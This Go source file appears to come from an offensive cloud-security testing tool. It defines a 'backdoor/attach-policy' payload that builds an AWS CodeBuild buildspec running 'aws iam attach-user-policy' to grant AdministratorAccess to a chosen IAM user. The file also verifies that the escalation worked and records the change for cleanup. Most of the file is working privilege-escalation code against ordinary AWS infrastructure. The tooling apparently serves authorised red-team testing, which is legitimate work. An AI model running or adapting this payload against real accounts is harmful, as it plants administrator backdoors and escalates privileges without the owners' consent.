// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package codebuild

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a CodeBuild buildspec that attaches a managed
// policy to an IAM user. The buildspec runs as bash inside the CodeBuild container,
// executing with the project's service role credentials.
type BackdoorAttachPolicyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess (or any managed policy) to an IAM user via CodeBuild buildspec"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceCodeBuild,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to attach the policy to (auto-resolved from caller identity if not set)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Managed policy ARN to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode returns a buildspec YAML that attaches the given policy to the target user.
// TARGET_USER and POLICY_ARN are substituted directly because bash in a buildspec
// container cannot read payload options from environment variables set by pathrunner.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	buildspec := fmt.Sprintf(`version: 0.2
phases:
  build:
    commands:
      - echo "Starting privilege escalation via buildspec override..."
      - aws iam attach-user-policy --user-name %s --policy-arn %s
      - echo "Successfully attached %s to %s"
`, targetUser, policyArn, policyArn, targetUser)

	return buildspec, nil
}

// VerifySuccess confirms the policy attachment by attempting iam:ListUsers, which requires
// admin-level IAM read access. This is called with the original starting identity after
// the build completes and IAM changes have propagated.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	iamClient := iam.NewFromConfig(config)

	_, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{
		MaxItems: aws.Int32(1),
	})
	if err != nil {
		return false, nil
	}

	return true, nil
}

// ReportSideEffects returns the policy attachment as a tracked resource so workspace
// cleanup can later detach it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←AdministratorAccess", targetUser),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": targetUser,
				"policy_arn":     policyArn,
			},
		},
	}
}

// ProcessResult returns a summary string. CodeBuild build output is not captured
// in the startbuild response, so the result comes from the module's verify step.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
